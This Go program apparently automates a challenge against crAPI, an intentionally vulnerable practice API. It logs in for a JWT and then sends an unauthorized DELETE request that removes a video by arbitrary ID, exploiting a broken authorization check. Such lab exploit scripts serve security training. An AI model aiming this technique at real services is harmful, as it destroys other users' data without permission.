package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"

	configurator "github.com/tomek-skrond/crapiconfigurator/v2"
)

func main() {
	config, err := configurator.GetConfig("../challenge-automation/config.yaml")
	if err != nil {
		log.Fatalln(err)
	}

	loginurl := fmt.Sprintf("%s%s", config.Hostname, config.LoginURL)
	token := configurator.GetJWTToken(loginurl, config.Email, config.Password)

	url := fmt.Sprintf("%s%s", config.Hostname, config.TargetURL)

	idFlag := flag.Int("id", 0, "ID of video to delete")
	flag.Parse()

	id := *idFlag

	fmt.Println("Deleting video with ID:", id)
	UnauthorizedVideoDeletion(token, url, id)
}

func UnauthorizedVideoDeletion(token, targeturl string, id int) {
	client := configurator.CustomHttpClient()

	url := fmt.Sprintf("%s/%d", targeturl, id)
	fmt.Println(url)
	req, err := http.NewRequest("DELETE", url, nil)
	if err != nil {
		log.Fatalln(err)
	}

	req = configurator.ConfigureRequest(req, token)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
	defer resp.Body.Close()

	body, _ := configurator.ReadBody(resp)

	fmt.Println(string(body))

}
